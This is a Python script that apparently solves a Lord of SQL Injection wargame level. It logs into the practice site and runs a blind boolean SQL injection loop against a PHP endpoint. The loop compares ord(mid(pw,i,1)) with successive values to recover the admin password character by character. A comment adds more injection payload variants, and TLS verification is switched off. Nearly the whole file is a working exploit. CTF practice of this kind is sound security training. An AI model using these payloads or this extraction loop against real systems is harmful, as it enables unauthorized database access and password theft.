import requests
import time
from bs4 import BeautifulSoup
import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()

def Auth():
    sess = requests.Session()
    url = 'https://los.eagle-jump.org/?login'
    data = {"id": "", "pw": ""} #credentials deleted
    sess.post(url, data = data)
    return sess

def checkSuccess(text):
    return text.find("<h2>Hello admin</h2>") > -1

def test(sess,url):
    injection =  "pw=' or (id='admin' and ord(mid(pw,1,1))<50)#"
    html = sess.get(url+injection, verify=False)
    print(html.text)

sess = Auth()
url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?"
#test(sess,url)

ans = ""
index = 1
guess = 0
while index < 11:
    for guess in range(0,255):
        injection =  "pw=' or (id='admin' and ord(mid(pw,"+str(index)+",1))<"+str(guess)+")%23"
        html = sess.get(url+injection, verify=False)
        if(checkSuccess(html.text)):
            print('find',index," ",chr(guess-1))
            ans = ans + chr(guess-1)
            break
        time.sleep(0.3)
    index = index + 1
print(ans)

'''
example payload:
injection = "no=1%20or%20(ord(mid(id,1,1))<98%20and%20ord(mid(pw,"+str(index)+",1))<"+str(guess)+")"
injection = "pw=a%27%20||%20(ascii(mid(id,1,1))>96 %26%26 ascii(mid(id,1,1))<98 %26%26 ascii(mid(pw," + str(index) + ",1))<" + str(guess) + ")%20--%20%27"
'''